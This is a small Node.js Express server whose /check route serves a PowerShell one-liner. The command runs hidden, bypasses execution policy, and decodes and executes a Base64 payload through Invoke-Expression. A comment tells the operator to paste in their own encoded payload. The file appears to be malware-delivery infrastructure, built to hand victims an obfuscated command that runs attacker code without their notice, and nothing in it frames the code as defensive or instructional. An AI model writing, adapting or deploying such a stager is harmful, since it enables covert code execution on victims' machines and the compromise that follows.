const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    // Make sure you paste your Base64 string below!
    res.send(`powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('PASTE_YOUR_BASE64_HERE')))"`);
});

app.listen(process.env.PORT || 3000);
